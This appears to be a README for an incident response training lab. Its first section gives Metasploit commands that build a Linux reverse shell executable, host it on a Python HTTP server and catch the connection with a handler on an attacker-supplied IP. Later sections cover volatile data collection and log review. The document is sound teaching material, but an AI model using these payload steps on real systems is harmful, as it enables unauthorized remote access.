# Incident Response Procedures

## Overview

This project provides a comprehensive framework for simulating and managing incident response scenarios. It encompasses creating malicious executables, collecting volatile data from compromised systems, and performing log analysis to detect unauthorized activities. By leveraging tools such as **Metasploit**, **Linux utilities**, and **Python HTTP Server**, this project demonstrates real-world incident response workflows, emphasizing the importance of detection, mitigation, and forensic analysis.

## Key Features

1. **Malicious Payload Creation**:
   - Generate reverse shell executables tailored for Linux systems using Metasploit.
   - Host malicious payloads using Python's HTTP server for remote deployment.

2. **Volatile Data Collection**:
   - Collect critical system data, including network configurations, running processes, and active connections.
   - Save findings in a structured report for forensic analysis.

3. **Log Analysis**:
   - Analyze system logs (`auth.log`, `btmp`, `wtmp`) to identify unauthorized access, failed login attempts, and suspicious activities.
   - Review timestamps and IP addresses to trace the origins of potential attacks.

4. **Incident Response Workflow**:
   - Simulate the response process from detection to mitigation and documentation.
   - Highlight best practices for evidence preservation and forensic reporting.

## Workflow Steps

### **1. Malicious Payload Creation**
- **Objective**: Simulate system compromise by creating a reverse shell executable.
- **Steps**:
  1. Launch Metasploit:
     ```bash
     msfconsole
     ```
  2. Search for a Linux payload:
     ```bash
     search linux/x64/shell_reverse_tcp
     use 0
     ```
  3. Configure the payload:
     ```bash
     set LHOST <your_IP_address>
     generate -f elf -o linux
     ```
  4. Host the payload using Python's HTTP server:
     ```bash
     python3 -m http.server
     ```
  5. Start the Metasploit handler:
     ```bash
     use exploit/multi/handler
     set payload linux/x64/shell_reverse_tcp
     set LHOST <your_IP_address>
     exploit
     ```

### **2. Volatile Data Collection**
- **Objective**: Gather critical data from compromised systems before shutdown.
- **Steps**:
  1. Escalate to root privileges:
     ```bash
     sudo su
     ```
  2. Create a structured report:
     ```bash
     echo "Incident Response Report" > report.txt
     ```
  3. Collect system data:
     ```bash
     date >> report.txt
     uname -a >> report.txt
     hostname >> report.txt
     ifconfig -a >> report.txt
     netstat -ano >> report.txt
     ps -aux >> report.txt
     route -n >> report.txt
     uptime >> report.txt
     ```
  4. Save and view the report:
     ```bash
     cat report.txt | less
     ```

### **3. Log Analysis**
- **Objective**: Investigate unauthorized access and identify attack patterns.
- **Steps**:
  1. Analyze system authorization logs:
     ```bash
     cat /var/log/auth.log | less
     ```
  2. Review failed login attempts:
     ```bash
     last -f /var/log/btmp | more
     ```
  3. Inspect login sessions:
     ```bash
     last -f /var/log/wtmp | more
     ```

## Tools and Technologies

1. **Metasploit Framework**: For creating malicious payloads and managing reverse shell connections.
2. **Linux Utilities**:
   - `ifconfig`: To display network interface configurations.
   - `netstat`: For monitoring active network connections.
   - `ps`: To list running processes.
3. **Python HTTP Server**: For hosting malicious executables.
4. **System Logs**:
   - `auth.log`: Tracks system authentication activities.
   - `btmp`: Logs failed login attempts.
   - `wtmp`: Records login/logout events and session durations.

## Learning Objectives

1. **Incident Simulation**:
   - Learn how reverse shells are created and deployed.
   - Understand how attackers gain unauthorized access to systems.

2. **Forensic Evidence Collection**:
   - Gather and preserve volatile data for post-incident analysis.
   - Document findings systematically for reporting purposes.

3. **Log Analysis and Attack Tracing**:
   - Use system logs to detect unauthorized access and trace attack origins.
   - Identify suspicious IP addresses, failed login attempts, and abnormal activity patterns.

4. **Response and Mitigation**:
   - Implement best practices for detecting, mitigating, and recovering from incidents.
   - Emphasize the importance of documentation in the incident response process.
